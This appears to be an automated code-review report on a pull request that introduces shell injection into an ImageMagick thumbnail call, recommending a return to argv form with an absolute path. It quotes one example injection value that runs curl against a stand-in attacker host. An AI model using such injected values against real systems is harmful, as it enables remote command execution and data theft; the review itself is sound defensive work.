findings.body:
**Command injection via `shell=True`.** `upload_dir`, `name`, and `oid` are interpolated into a shell command string. A crafted `name` such as `x; curl evil.test/$(id)` (or any value with `;`, `|`, `$()`, backticks) executes arbitrary commands as the service user.

ImageMagick 7 policy delegates do not require a shell — Policy.xml applies to MagickCore whether you exec `convert` directly or via `sh -c`. Revert to argv-list form (`shell=False`). If IM7 needs the `magick` frontend, only change the executable:

```suggestion
    subprocess.run(
        ["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
        check=True,
    )
```

Never pass user-influenced path segments through the shell; keep one argv element per argument so metacharacters stay data.

**Bare `convert` on PATH.** The previous code used `/usr/bin/convert` (absolute path). The new shell command resolves `convert` via `$PATH`, which is weaker under a compromised or surprising environment (dependency confusion / PATH prepend on the runner/service account).

When restoring argv form, keep the absolute path (or `/usr/bin/magick` on IM7) so the binary cannot be shadowed.

summary:
## Verdict

**Critical security regression** — this PR introduces shell injection by switching `subprocess.run` from argv-list form to `shell=True` with unescaped interpolation of `upload_dir`, `name`, and `oid`.

## Findings

| # | Severity | File | Summary |
|---|----------|------|---------|
| 1 | 🚨 critical | `thumbs.py:6` | `shell=True` with f-string interpolation enables command injection |
| 2 | ⚠️ warning | `thumbs.py:6` | Bare `convert` drops absolute path; PATH/name resolution weaker than `/usr/bin/convert` |

## Details

ImageMagick 7 policy delegates do **not** require a shell. Policy.xml constrains which coders/delegates MagickCore may invoke; that applies equally to the argv-list form. The previous call was the correct pattern:

```python
subprocess.run(
    ["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
    check=True,
)
```

If IM7 needs the `magick` binary instead of `convert`, change only the executable path — keep `shell=False` and an argument vector.

Any value of `name` (or `upload_dir` / `oid`) containing shell metacharacters (`;`, `|`, `$(...)`, backticks, spaces, etc.) becomes attacker-controlled command execution on the host that writes thumbs. The removed comment claimed upstream ALLOWED_FILES validation; even if that regex still exists elsewhere, shell interpolation is the wrong boundary — argv form does not need that hope.

## Release decision

**Recommendation:** request-changes
